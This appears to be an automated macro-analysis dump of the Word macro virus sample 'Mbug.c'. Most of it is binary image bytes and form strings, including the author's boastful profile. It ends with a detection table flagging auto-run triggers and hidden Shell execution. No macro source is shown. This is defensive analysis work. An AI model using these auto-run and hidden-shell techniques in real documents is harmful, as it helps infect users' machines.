-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f�f3f̙̙3��f��3�3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��f��������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3f�f�8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�3f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*\Ȱ�Ç
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� %n<A��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��ˊ0U�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8sΨ8s&
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@u��	�gУ;�f4�4�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6���ER�Q��*C�S�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cJ�ڵE��`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Y�i5jm�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@Fժ{_x����]�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Zt�<W�Yƀ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Vk���ˌ�nV
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s.��vQƌ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�i̩c?���5j�8E�ua�6E�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�tv���1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�S�=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����W���h���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~o.~������O�]�|����G�~}s��A��r�Q��a����o
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:����ѧ�d�ݗa�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$���W
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}}��a*��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��IF�a<re
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�8ِe�%�D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�ْ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�F+Đ�l@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
18�B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%CG5��Bp_zgT^��ɑ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

��' '�>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��G�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ca<�6蠪��WP/�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�a'�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d�6�y(��.�'~���#E�9%�x�|*4��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w�m���Z4A(�M|��b�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�fabD�JT^���%�ZqŤ����ᤒ����m�����	��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*dr>�5�����U��U��B��T'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�e�.�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U����JR�e��.�֩
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/\Ù�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:�a<u�qW
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i)Ba�a�Wg�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mJ�豨r\�U=z
@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�[؛-K���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oP+&5�]�M��hBV�Q���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�dgR�ۿ1Э��l��p�6zm�	o��%S�ZMC
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�oJ��u�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�f��S��*<x��R~��f�=�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ۭzJ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�밣�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�zsc�n绫�s���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z=2,��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���j����̇���˃~��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#m&�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�=��C�d@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VTHis image created by THe SKuLL!!
� 1996 SKuLL Penndragon, Inc.
All Rights Reserved.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIFCONnb1.0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

bear2.gif
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

bear3.gif
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

bear4.gif
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

bear5.gif
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

bear6.gif
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

bear7.gif
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Name: Coolzeroa
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nation: Chinese
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Height: 180cm
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sex: M@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Born: 1290 Jan 1�	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Interest: CreatingA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�             viruses�	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Food: PC Filesa
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Hate: KDUwA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Desire: Become a �A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PC KillerwA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�View More?A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

